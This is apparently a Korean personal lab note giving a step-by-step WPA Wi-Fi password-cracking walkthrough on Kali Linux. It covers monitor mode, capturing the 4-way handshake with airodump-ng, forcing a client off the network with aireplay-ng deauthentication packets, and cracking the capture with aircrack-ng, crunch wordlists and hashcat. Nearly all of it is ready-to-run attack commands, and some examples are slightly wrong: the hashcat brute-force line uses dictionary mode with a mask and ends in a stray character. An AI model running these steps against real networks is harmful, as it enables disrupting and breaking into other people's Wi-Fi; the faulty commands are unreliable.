# wifi carack

Created: 2022년 6월 19일 오후 3:34
Tags: wifi

## 환경 구성

- Kali Linux 2019.2 (VMware)
- Android
- USB Type 무선 랜카드 ipTIME A1000UA-4dBi
- 무선 AP ipTIME N904ns
- IP Cam

### Dump 4-way handshake Packet

1. USB 무선 랜카드를 진단 PC에 연결

2. Kali linux에서 무선 랜카드 인식 확인

```bash
$ iwconfig
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled.png)

3. Wireless adapter monitor 모드 시 충돌하는 프로세스 종료

monitor 모드로 전환 시 특정 프로세스 때문에 정상적으로 작동하지 않는 경우가 존재하며, 아래 명령어를 이용하여 해당 프로세스를 종료

```bash
$ airmon-ng check kill
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%201.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%201.png)

4. 확인된 wlan0 무선랜 인터페이스를 모니터모드로 변경

```bash
$ airmon-ng start wlan0
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%202.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%202.png)

5. 모니터모드 변경 확인

```bash
$ iwconfig
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%203.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%203.png)

6. 무선 랜카드에 잡히는 타겟 SSID 확인

```bash
$ airodump-ng wlan0mon
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%204.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%204.png)

7. 확인된 AP의 패킷 캡처 시작

wifi 통신중인 기기(Android)를 대상으로 캡처를 수행

```bash
$ airodump-ng --bssid [BSSID] -c 1 -w [packetname] wlan0mon
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%205.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%205.png)

8. 쉘을 새로 띄운 후 Deauthenticate 패킷을 이용하여 강제 연결 해제

Deauthenticate 패킷은 Wi-Fi 통신을 하고 있는 기기를 강제로 끊을 때 사용하는 패킷으로, 연결되어 있는 AP와 클라이언트에 가짜 Deauthenticate 패킷을 전송하여 연결을 차단함

```bash
$ aireplay-ng -0 5 -a [AP BSSID] -c [Victim BSSID] wlan0mon
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%206.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%206.png)

9. 패킷 덤프중인 쉘에서 WPA handshake 수행 확인

Deauthenticate 패킷에 의해 연결이 강제적으로 종료되면, Android는 이상을 감지하고 다시 재연결을 시도하게 되므로 4-웨이 핸드쉐이크(4-Way Handshake) 과정이 다시 수행됨

Android 기기의 WPA handshake 수행을 확인하고 덤프 종료

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%207.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%207.png)

10. Wireshark로 패킷 내에 4-way handshake 패킷이 존재하는지 확인

덤프된 패킷을 Wireshark로 열어 EAPoL 프로토콜로 필터링하면 handshake 패킷을 확인할 수 있음

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%208.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%208.png)

## Crack 4-way hanshake packet

패스워드 크랙은 Bruteforce 공격을 이용한 크랙이며, 두 가지 툴을 이용할 수 있음

- aircrack-ng
- hashcat

### [aircrack-ng]

1. Brute Force 공격에 사용할 사전파일 생성 또는 작성

- Kali 사전파일 경로
    
    /usr/share/wordlist/rockyou.txt
    

사전파일 작성엔 Kali에 설치된 Crunch를 이용하여 작성 가능

```bash
$ crunch [min] [max] [사용할 문자] [옵션]

[option]
-t : 고정할 문자 지정
-o : output 생성할 파일명

[ex]
$ crunch 9 9 0123456789abcdefghijklnmopqrstuvwxyz -t 1234567@@ -o Test

최소 9글자, 최대 9글자, [0~1][a~z]문자 사용, 앞 1234567은 고정하고 @@ 부분을 조합, Test파일로 생성
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%209.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%209.png)

2. 사전파일을 이용해 패스워드 크랙 수행

```bash
$ aircrack-ng -b [AP BSSID] -w [Dictionary] [packet]

[ex]
$ aircrack-ng -b 64:E5:99:0E:F7:5A -w Test packet-01.cap
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2010.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2010.png)

[hashcat]

1. hashcat을 이용한 크랙 시 .cap 파일을 .hccapx 로 확장자를 변환 필요

```bash
$ /usr/lib/hashcat-utils/cap2hccapx.bin [input.cap] [output.hccapx]

[ex]
$ /usr/lib/hashcat-utils/cap2hccapx.bin packet.cap packet.hccapx
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2011.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2011.png)

2. 사전 파일을 이용한 크랙

```bash
$ hashcat -m 2500 -a 0 [.hccapx] [wordlist]

[ex]
$ hashcat -m 2500 -a 0 packet1.hccapx Test
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2012.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2012.png)

3. bruteforce를 이용한 크랙

```bash
$ hashcat -m 2500 -a 0 [.hccapx] [mask]

[ex]
$ hashcat -m 2500 -a 0 packet1.hccapx ?d?d?d?d?d?d?d?d?|
```

![wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2013.png](wifi%20carack%2020531c5ab5bb4c8c93cefb5411cbbe96/Untitled%2013.png)